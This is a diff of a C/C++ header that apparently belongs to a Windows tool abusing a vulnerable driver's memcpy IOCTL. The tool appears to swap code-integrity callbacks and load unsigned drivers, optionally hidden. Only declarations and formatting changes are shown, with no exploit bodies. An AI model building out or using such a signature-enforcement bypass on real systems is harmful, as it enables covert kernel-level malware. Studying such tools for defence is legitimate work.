@@ -13,6 +13,7 @@
 #define FILE_DEVICE_GIO				(0xc350)
 #define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+
 static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];
 
 struct seCiCallbacks_swap
@@ -29,32 +30,37 @@ typedef struct _GIOMemcpyInput
 } GIOMemcpyInput, * PGIOMemcpyInput;
 
 namespace vuln {
-	static NTSTATUS
-		TriggerExploit(
-			_In_ PWSTR LoaderServiceName,
-			_In_ PWSTR DriverServiceName
-		);
+	NTSTATUS TriggerExploit( _In_ PWSTR LoaderServiceName, _In_ PWSTR DriverServiceName );
+
 	NTSTATUS WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden );
+
 	NTSTATUS WindUnloadDriver( PWCHAR DriverName, BOOLEAN Hidden );
 }
 
 
 namespace modules {
-	static NTSTATUS FindKernelModule( PCCH ModuleName, PULONG_PTR ModuleBase );
-	static ULONG_PTR GetKernelModuleAddress( const char* name );
+	NTSTATUS FindKernelModule( PCCH ModuleName, PULONG_PTR ModuleBase );
+
+	ULONG_PTR GetKernelModuleAddress( const char* name );
+
 	seCiCallbacks_swap get_CIValidate_ImageHeaderEntry();
+
 	NTSTATUS OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors );
+
 	NTSTATUS CreateDriverService( PWCHAR ServiceName, PWCHAR FileName );
+
 	NTSTATUS LoadDriver( PWCHAR ServiceName );
+
 	NTSTATUS UnloadDriver( PWCHAR ServiceName );
 }
 
 namespace helpers {
 	DWORD64 FindBytes64( DWORD64 imageBase, SIZE_T imageSize, const unsigned char* pattern, SIZE_T patternLen );
-	static void* mapFileIntoMem( const char* path );
-	void* signature_search( char* base, char* inSig, int length, int maxHuntLength );
+
 	void FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName );
-	ULONG_PTR signatureSearchInSection( char* section, char* base, char* inSig, int length );
+
 	int ConvertToNtPath( PWCHAR Dst, PWCHAR Src );
+
 	void DeleteService( PWCHAR ServiceName );
 }
+
